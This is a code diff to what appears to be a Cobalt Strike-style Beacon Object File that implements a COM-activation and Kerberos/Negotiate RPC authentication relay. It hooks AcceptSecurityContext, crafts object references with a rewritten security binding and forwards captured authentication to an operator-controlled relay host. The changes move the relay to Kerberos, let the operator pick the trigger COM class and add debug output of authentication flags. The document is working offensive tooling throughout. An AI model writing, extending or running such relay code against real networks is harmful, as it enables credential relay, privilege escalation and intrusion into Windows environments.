@@ -215,6 +215,10 @@ typedef struct {
     DWORD protected_thread_id;
     int callback_count;
     int relayed_leg_count;
+    int relay_auth_type;
+    int relay_auth_level;
+    ULONG accept_request_flags;
+    ULONG accept_return_flags;
     int success;
     int stage;
     int detail;
@@ -1236,7 +1240,7 @@ static int build_objref(IUnknown *anchor, TRIGGER *trigger) {
     cursor += 2;
 
     if (g_state.rewrite_security_binding) {
-        wr16(cursor, RPC_C_AUTHN_GSS_NEGOTIATE);
+        wr16(cursor, RPC_C_AUTHN_GSS_KERBEROS);
         wr16(cursor + 2, 0xffff); /* default authorization service */
         cursor += 4;
         for (i = 0; i <= spn_chars; i++) {
@@ -1406,6 +1410,9 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
             frag_len <= rpc_len && frag_len >= 8 && auth_len <= frag_len - 8) {
             token_offset = frag_len - auth_len;
             auth_type = rpc[token_offset - 8];
+            g_state.relay_auth_type = auth_type;
+            g_state.relay_auth_level = rpc[token_offset - 7];
+            g_state.accept_request_flags = req;
             relay_rpc = auth_type == RPC_C_AUTHN_GSS_NEGOTIATE ||
                         auth_type == RPC_C_AUTHN_GSS_KERBEROS;
         }
@@ -1469,6 +1476,9 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
     temporary_output.pBuffers = &temporary_buffer;
     status = call_original_accept(cred, context, input, req, rep, newctx,
                                   &temporary_output, attrs, expiry);
+    if (attrs) {
+        g_state.accept_return_flags = *attrs;
+    }
     release(temporary_buffer.pvBuffer);
 
     /* If bridge setup or I/O failed, the isolated native output cannot be
@@ -1705,7 +1715,7 @@ static int activation_once(CLSID *clsid) {
     result.pIID = &KIID_IUnknown;
 
     BeaconPrintf(CALLBACK_OUTPUT,
-                 "[*] Triggering COM object: McpManagementService\n");
+                 "[*] Triggering operator-selected COM activation\n");
     g_state.stage = STAGE_ACTIVATION;
     hr = OLE32$CoGetInstanceFromIStorage(
         NULL, clsid, NULL, CLSCTX_LOCAL_SERVER,
@@ -1823,7 +1833,7 @@ static int initialize_worker_com(void) {
     }
     kcopy(persistent_principal, g_state.service_spn,
           (principal_chars + 1) * sizeof(WCHAR));
-    persistent_service->dwAuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
+    persistent_service->dwAuthnSvc = RPC_C_AUTHN_GSS_KERBEROS;
     persistent_service->pPrincipalName = persistent_principal;
 
     /* patch_firewall_name borrows the PEB image-name buffer. Restore those
@@ -1837,7 +1847,7 @@ static int initialize_worker_com(void) {
 
     g_state.stage = STAGE_COM_SECURITY;
     hr = OLE32$CoInitializeSecurity(
-        NULL, 1, persistent_service, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
+        NULL, 1, persistent_service, NULL, RPC_C_AUTHN_LEVEL_CONNECT,
         RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);
     kcopy(image_name->Buffer, saved_image_name, sizeof(saved_image_name));
 
@@ -1889,7 +1899,7 @@ static int register_task_resolver(void) {
     }
 
     status = RPCRT4$RpcServerRegisterAuthInfoW(
-        NULL, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, NULL);
+        NULL, RPC_C_AUTHN_GSS_KERBEROS, NULL, NULL);
     if (status) {
         g_state.detail = (int)status;
         return 0;
@@ -1986,6 +1996,10 @@ static int run_relay(void) {
         BeaconPrintf(CALLBACK_OUTPUT,
                      "[+] Relay bridge connected via %s:%d\n",
                      g_state.relay_host, g_state.relay_port);
+        BeaconPrintf(CALLBACK_OUTPUT,
+                     "[*] RPC auth type=%d level=%d ASC req=0x%08lx ret=0x%08lx\n",
+                     g_state.relay_auth_type, g_state.relay_auth_level,
+                     g_state.accept_request_flags, g_state.accept_return_flags);
     }
     for (leg = 1; leg <= g_state.relayed_leg_count; leg++) {
         BeaconPrintf(CALLBACK_OUTPUT,
@@ -2193,7 +2207,7 @@ static int parse_arguments(char *args, unsigned long args_len) {
         g_state.stage = STAGE_RPC_ENDPOINT;
         return 0;
     }
-    /* The trigger class is parsed dynamically even though the CNA supplies one fixed CLSID. */
+    /* The CNA supplies the default or an operator-selected trigger CLSID. */
     value = BeaconDataExtract(&parser, &value_len);
     if (!ascii_to_wide(value, value_len, g_state.trigger_clsid,
                        sizeof(g_state.trigger_clsid) / sizeof(WCHAR))) {
